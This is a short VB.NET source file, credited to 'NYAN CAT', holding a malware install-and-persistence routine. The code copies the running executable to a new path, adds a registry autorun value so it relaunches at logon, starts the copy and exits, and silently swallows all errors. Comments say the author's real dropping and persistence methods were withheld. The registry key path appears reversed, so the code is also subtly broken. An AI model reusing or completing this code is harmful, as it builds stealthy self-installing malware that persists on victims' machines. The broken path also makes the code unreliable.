'******* https://github.com/NYAN-x-CAT
'******* Credit to NYAN CAT

Public Class Main

    Public Shared Sub ST(ByVal LOC As String)
        Try
            Dim Current As String = Diagnostics.Process.GetCurrentProcess.MainModule.FileName
            If Current <> LOC Then
                If Not IO.Directory.Exists(IO.Path.GetDirectoryName(LOC)) Then
                    IO.Directory.CreateDirectory(IO.Path.GetDirectoryName(LOC))
                End If

                'You have to create your own dropping method, I can't share mine here.
                Using FS As New IO.FileStream(LOC, IO.FileMode.Create)
                    Dim EXE As Byte() = IO.File.ReadAllBytes(Current)
                    FS.Write(EXE, 0, EXE.Length)
                    FS.Flush()
                    FS.Dispose()
                    EXE = Nothing
                End Using

                AddedReg(LOC)
                Try : Process.Start(LOC) : Environment.Exit(0) : Catch : End Try

            End If
        Catch ex As Exception
        End Try



    End Sub

    Public Shared Sub AddedReg(ByVal LOC As String)
        'You have to create your own persistence method, I can't share mine here.
        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\Run\CurrentVersion\").SetValue(IO.Path.GetFileName(LOC), LOC) : Catch : End Try
    End Sub
End Class

